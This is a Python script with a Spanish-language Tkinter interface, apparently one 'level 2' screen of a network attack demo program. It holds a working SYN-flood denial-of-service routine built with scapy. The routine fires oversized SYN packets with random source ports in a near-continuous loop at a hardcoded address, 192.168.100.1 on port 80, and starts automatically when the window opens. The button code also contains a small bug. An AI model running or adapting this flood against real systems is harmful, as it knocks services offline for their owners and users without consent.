from tkinter import Toplevel, Label, Button
from scapy.all import IP, TCP, send, RandShort, Raw
import threading
import time

def syn_flood(target_ip, target_port, stop_attack):
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * 12218)
    p = ip / tcp / raw

    # Envio de paquete
    while not stop_attack.is_set():
        send(p, verbose=0)
        time.sleep(0.0001)

def attack2(main_screen):
    def on_closing():
        stop_attack.set()  
        messageWindow.destroy()
        main_screen.deiconify()

    messageWindow = Toplevel(main_screen)
    messageWindow.title("Ataque nivel 2")
    messageWindow.attributes('-fullscreen', True)  
    messageWindow.config(background="#65707F")

    tit = Label(messageWindow, text="Este es el ataque de nivel 2", font="Helvetica 20 bold", bg="#65707F", fg="white")
    tit.pack(pady=50)

    sub = Label(messageWindow, text="Ataque de Denegación de Servicio", font="Helvetica 20", bg="#65707F", fg="white")
    sub.pack()

    # Detener ataque
    stop_attack = threading.Event()

    # Target
    target_ip = "192.168.100.1"
    target_port = 80

    # Inicia el ataque en un hilo
    attack_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, stop_attack))
    attack_thread.start()

    btn_back = Button(messageWindow, text="Detener Ataque y Regresar", font=12, height=4, width=30, bg="black", fg="white", command=on_closing).pack()
    btn_back.grid(row=0,column=1,padx=10, pady=10, sticky="nsew")

    messageWindow.protocol("WM_DELETE_WINDOW", on_closing)
